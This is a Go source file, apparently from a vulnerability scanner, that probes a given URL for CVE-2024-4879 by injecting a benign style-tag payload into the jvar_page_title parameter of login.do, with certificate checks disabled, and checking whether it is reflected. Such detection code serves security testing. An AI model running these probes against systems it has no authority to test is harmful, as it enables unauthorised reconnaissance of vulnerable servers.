package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func CVE_2024_4879(url string, Attack bool) error {
	url1 := url + "/login.do?jvar_page_title=<style><foo>abc</foo></style>"
	url2 := url + "/?jvar_page_title=<style><foo>abc</foo></style>"
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	request2, err := http.NewRequest("GET", url2, nil)
	if err != nil {
	}

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "><style><foo>abc</foo></style>") || strings.Contains(string(body2), "><style><foo>abc</foo></style>") {
		fmt.Println("[*]CVE-2024-4879 : " + url)
		if Attack {
			if strings.Contains(string(body), "><style><foo>abc</foo></style>") {
				fmt.Println("Attack-Result : " + url1 + "\n")
			} else {
				fmt.Println("Attack-Result : " + url2 + "\n")
			}
		}
	}

	return nil
}
